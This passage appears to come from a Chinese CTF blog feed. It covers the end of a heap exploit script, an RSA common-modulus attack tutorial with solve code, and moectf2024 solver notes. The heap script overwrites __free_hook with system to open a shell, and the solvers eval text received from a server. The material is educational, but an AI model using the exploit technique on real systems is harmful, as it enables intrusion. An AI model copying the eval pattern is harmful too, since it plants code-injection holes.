function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The index of this note : &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The size of this content : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The content of this note : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The index of this note : &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The index of this note : &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;The content of this note is : &quot;</span>)</span><br><span class="line">libc_base=u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># tcahcebin unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(__free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,size(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(system_addr)) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共模攻击</title>
      <link href="/2024/10/16/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="rsa中的共模攻击"><a href="#rsa中的共模攻击" class="headerlink" title="rsa中的共模攻击"></a>rsa中的共模攻击</h1><p><a class="link" href="https://blog.csdn.net/serendipity1130/article/details/120154534">参考文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>共模攻击是指在不分解d的情况下依旧可以求出m的一种算法，常见给出了c1,c2：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m , e1 , N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m , e2 , N)</span><br></pre></td></tr></table></figure></div><p><mark>要求gcd(e1 , e2)&#x3D;1,即e1,e2互质<mark>,那么则有:</mark></mark></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e1*s1 + e2*s2 = <span class="number">1</span></span><br><span class="line">// s1,s2一正一负</span><br></pre></td></tr></table></figure></div><p>可以有:<mark>m &#x3D; ( c1^s1 * c2^s2) % N<mark>，下面给出证明：</mark></mark></p><p><color red>注意：<color red>此处并不是说c的s次方，而是c关于N的s次逆元是多少。</color></color></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(c1^s1 * c2^s2) % N = ( ((m^e1)%N) ^ s1 * (((m^e2)%N) ^ s2)</span><br><span class="line">    // 将%N 去除，具体可以看开头文章</span><br><span class="line">                    = ( m ^ (e1*s1 + e2*s2))%N</span><br><span class="line">                    = m     </span><br></pre></td></tr></table></figure></div><p><mark>注意<mark></mark></mark></p><p>假定s2为负数，并不是对c2开根号，而是<code>求c2的逆元</code>，交给pow函数即可</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">key_size = <span class="number">1024</span></span><br><span class="line">p = getPrime(key_size // <span class="number">2</span>)</span><br><span class="line">q = getPrime(key_size // <span class="number">2</span>)</span><br><span class="line">N = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">e2 = <span class="number">7</span></span><br><span class="line">message = <span class="string">b&quot;NSSCTF&#123;...............................................&#125;&quot;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gcd(m, N) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#N =  80722936701364382749961243326484006977187702986017980842794443374132452156776306032868217795522046975068822236770836452911408536092460646410756678157902792329645719935468879960944028782788489463895870961967670931567205550383999951787250211085264314795753745003815839218062934564501884684565508432346164094171</span></span><br><span class="line"><span class="comment">#e1 = 3</span></span><br><span class="line"><span class="comment">#c1 = 77027474990431732719325428265107176934045610651944725251406683442684093440239073195437770144166442593914418380343458827052860752131667771506129334676070396374008929588455988149871039697387983766750148969695215583137356681988572655848921827794639096404716760310059622671470680330144220097050812716421370445797</span></span><br><span class="line"><span class="comment">#e2 = 7</span></span><br><span class="line"><span class="comment">#c2 = 13491956530007991248882899018888359080930858500993821006822695375714947537976202424265808646466853291165511243721829370428583392329886743499827454177786585477285598196204906977043127274613692623229137936467994670727274820568522666762615055848367486507714640497446688083840123758417442971555904294548595887600</span></span><br></pre></td></tr></table></figure></div><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><ul><li>e1 和 e2 明显互质，可以用共模攻击，先求出s1和s2，随便选取一个即可，然后直接求出m即可：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入的 RSA 参数</span></span><br><span class="line">N = <span class="number">80722936701364382749961243326484006977187702986017980842794443374132452156776306032868217795522046975068822236770836452911408536092460646410756678157902792329645719935468879960944028782788489463895870961967670931567205550383999951787250211085264314795753745003815839218062934564501884684565508432346164094171</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">c1 = <span class="number">77027474990431732719325428265107176934045610651944725251406683442684093440239073195437770144166442593914418380343458827052860752131667771506129334676070396374008929588455988149871039697387983766750148969695215583137356681988572655848921827794639096404716760310059622671470680330144220097050812716421370445797</span></span><br><span class="line">e2 = <span class="number">7</span></span><br><span class="line">c2 = <span class="number">13491956530007991248882899018888359080930858500993821006822695375714947537976202424265808646466853291165511243721829370428583392329886743499827454177786585477285598196204906977043127274613692623229137936467994670727274820568522666762615055848367486507714640497446688083840123758417442971555904294548595887600</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">if</span> e1 * i - e2 * j == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i , j, e1 * i + e2 * j )</span><br><span class="line">s1 = <span class="number">5</span></span><br><span class="line">s2 = -<span class="number">2</span></span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s1, N) * <span class="built_in">pow</span>(c2, s2, N)) % N</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="特例-gcd-e1-e2-1"><a href="#特例-gcd-e1-e2-1" class="headerlink" title="特例-gcd(e1,e2) !&#x3D; 1"></a>特例-gcd(e1,e2) !&#x3D; 1</h1><ul><li>上述说了，共模攻击是要求e1和e2互质，即(e1,e2)&#x3D;1，才有<code>e1*s1+e2*s2=1</code>,才可以继续进行后续的操作</li><li>但是若(e1,e2)!&#x3D;1，而有<code>(e1,e2)=e</code>呢？此时是有<code>e1*s1+e2*s2=e</code>的，按照上述的推理，我们得到的应该是</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(c1^s1 * c2^s2) % N = (m ^ e)%N</span><br></pre></td></tr></table></figure></div><p>分两种情况：</p><p><code>1: m^e &lt; N:</code> 那么此时直接开e次根即可</p><p><code>2: m^e &gt; N:</code>此时直接开根答案并不对</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M = (c1^s1 * c2^s2) % N = (m ^ e)%N</span><br><span class="line">-&gt; m^e = k*n + M (k=<span class="number">1</span>,<span class="number">2</span>,.....)</span><br></pre></td></tr></table></figure></div><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e1*e2= <span class="number">59653</span></span><br><span class="line">n= <span class="number">16282992590526808657350657123769110323293742472515808696156540766049532922340638986423163288656942484229334024198335416611687418341772216996129634991032127943095069143600315325916614910606100091970611448259491799589221889445348698100959509165262891180065554743420149168801638644589921791426690475846945077068114953844817073866258377206796158690941199907230130273657375727245023893672164113928189304228859412794067127721813637080447782673535996272223836127807775157150041664783263093604946744032762535394974814371771505843653571711445892969781888188805943142126747365056482511805191315474848971218180999336497135314654469910566730389765499603897685968204361422568601724914800686608628299192714352963744010136960423806304763245890692476493455775025753944860040020178234660999290356849442926396627701588938894161779071628447041006556793933320976506046066961014953196791133933438500843139378274786265308568167479880984705152809744111382599071097574636570516674122980589207824718402382459624138317432883921371298272851693734695823787102433937406420318428888224246291987404818042038201886113203158444083427668636941</span></span><br><span class="line">c1= <span class="number">15508846802476602732219982269293312372397631462289816533805702700260237855119470146237752798828431803179124957728439730580289236458563016332461725094295883030444173189424666004498359269921250956676320570006883951982237098373954348825003467019876101438948387668628518937831820206221522881150831840296199498447304138839838135264071071817072965792514115711621435317078108239744829134467948386247696344881838815422262901903767893118533887779588425725845820071451782420200868341564360095012698956683395031351656817392008005928265838760875070634021907630535014959579709368637536268853337028760833769278841040734409299575870823873616769863828516877971432999417800417684146077045836940988096634144368727546539602310924702126212020003620219218637652874119299016382481718659448722433296761241365473608283436835986184098161365747699791248301452334044327014782249692551362625130537300221641910570569803981153117200694806974917501061411963827755822672178568783269357196133308719688843211664095412087717861154226475203597889635926903753481174280305996204091501578865951177135086807765873529089048911740160698421289371229606</span></span><br><span class="line">c2= <span class="number">7038544062804420883340530319534054090343999593726615071597649914714397773106261660516938820194721330117082799104642674913839235601210294807255855747823709326405317366422536981850436536877639492293904186333547681934006229055311359852552059601531864585759120757265084674695094298158389804437120173997679271166467086009884419942249925895393890707373985126949313101489352481737754459985522998334847972008827503987883850638250024631354158979424169551575287515128697843093987592614974905262077415255065744686115142126350167970451060399517705823298929164793769442986603707135790651560436497661713972277808036463771768932747376668116480068277125579165831615220097562066809632099809702980365194257899499384219864311379004681733844738981954144617140038448109869114888325128710654235506628539192955240723379334422880368605005772426413018696218105733457019400100498450734710865067764542737004071080719589912326985050985424145053072697267879019954400205613591419766583673115931337146967400159040252514654983240188915104134405655336152730443436887872604467679522955837013574944135975481174502094839012368918547420588186051</span></span><br></pre></td></tr></table></figure></div><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><ul><li>直接上题解</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据均在上面，为了方便看，就不填入了</span></span><br><span class="line">n = ...</span><br><span class="line">c1 = ...</span><br><span class="line">c2 = ...</span><br><span class="line"><span class="comment"># e1 * e2 = 59653</span></span><br><span class="line">e1e2 = <span class="number">59653</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1, e2, c1, c2, n</span>):</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1, s2 = s[<span class="number">1</span>], s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1, c1 = -s1, gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2, c2 = -s2, gmpy2.invert(c2, n)</span><br><span class="line"></span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        mk = c + n * k</span><br><span class="line">        flag, true1 = gmpy2.iroot(mk, e)</span><br><span class="line">        <span class="keyword">if</span> true1:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2 % e1 == <span class="number">0</span>:</span><br><span class="line">        e2 = e1e2 // e1</span><br><span class="line">        c = rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e = gmpy2.gcd(e1, e2)</span><br><span class="line">        m1 = de(c, e, n)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> long_to_bytes(<span class="built_in">int</span>(m1)):</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure></div><ul><li>下面对exp解释：</li></ul><ol><li>先找到合适的e1,e2,以及对应的M</li></ol><p><code>gmpy2.gcdext(e1,e2)</code>:</p><blockquote><p>返回一个包含三个值的元组</p><p>s[0]-&gt;gcd(e1,e2)，s[1]-&gt;s1, s[2] -&gt; s2 (e1<em>s1 + e2</em>s2 &#x3D;&#x3D;gcd(e1,e2))</p></blockquote><p><code>gmpy2.invert(c, n)</code></p><blockquote><p>计算c关于模m的逆元</p></blockquote><p>  2.c(M)带入爆破，此时满足<code> mk = c + n * k</code></p><p><code>gmpy2.iroot</code></p><blockquote><p>用于计算整数 <code>x</code> 的 <code>k</code> 次根。它返回一个元组 <code>(root, is_exact)</code>，其中：</p><ol><li><strong>root</strong>：<code>x</code> 的 <code>k</code> 次根的整数部分。</li><li><strong>is_exact</strong>：一个布尔值，指示 <code>root</code> 是否是 <code>x</code> 的确切 <code>k</code> 次根</li></ol></blockquote><p>  3.判断爆破出来的是否包含flag即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moectf2024知识点汇总</title>
      <link href="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/"/>
      <url>/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a class="link" href="https://ctf.xidian.edu.cn/training/10">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>本次比赛对基础的要求可谓是很深啊，记录一些自己需要学习的或者是基础不牢固，所需要学习的点</p><h1 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a><strong>NotEnoughTime</strong></h1><p><a class="link" href="https://ctf.xidian.edu.cn/training/10?challenge=63">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><mark>运用正则匹配运算数学式子<mark></mark></mark></p><ul><li>贴一份官方wp</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = ...</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">io.sendline(</span><br><span class="line"><span class="built_in">str</span>(</span><br><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">io.recvuntil(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line">.replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">.replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">.replace(<span class="string">b&quot;/&quot;</span>, <span class="string">b&quot;//&quot;</span>)</span><br><span class="line">.decode()</span><br><span class="line">)</span><br><span class="line">).encode()</span><br><span class="line">)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>自己解题时候的exp(重度依赖gpt)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建与本地服务的连接</span></span><br><span class="line">host = <span class="string">&quot;192.168.107.52&quot;</span></span><br><span class="line">port = <span class="number">64064</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_to_service</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># 只保留数字、四则运算符、括号和等号</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^0-9+\-*/()=]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expression)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># 去掉等号部分</span></span><br><span class="line">    expression = expression.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 替换 / 为 // 进行整除计算</span></span><br><span class="line">    expression = expression.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;//&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 计算算式</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;计算失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = connect_to_service()</span><br><span class="line">    buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">    data = s.recv(<span class="number">67</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 每秒读取服务端的输出</span></span><br><span class="line">        data = s.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        buffer += data</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;收到数据:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取算式</span></span><br><span class="line">        expression = clean_expression(buffer)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> expression:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提取的算式:&quot;</span>, expression)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算结果</span></span><br><span class="line">            result = calculate_expression(expression)</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># 发送结果</span></span><br><span class="line">                result_str = <span class="built_in">str</span>(result) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                s.send(result_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;发送答案: <span class="subst">&#123;result_str.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 清空缓冲区</span></span><br><span class="line">            buffer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否有 flag</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;moectf&#123;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag 获取:&quot;</span>, re.search(<span class="string">r&#x27;moectf\&#123;.*?\&#125;&#x27;</span>, data).group())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h1 id="这是什么？random！"><a href="#这是什么？random！" class="headerlink" title="这是什么？random！"></a><strong>这是什么？random！</strong></h1><p><mark>真随机数爆破<mark></mark></mark></p><p>在我写的<a href="https://downbeat.top/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/">这篇文章</a>里面已经提到过了</p><h1 id="这是什么？GOT！"><a href="#这是什么？GOT！" 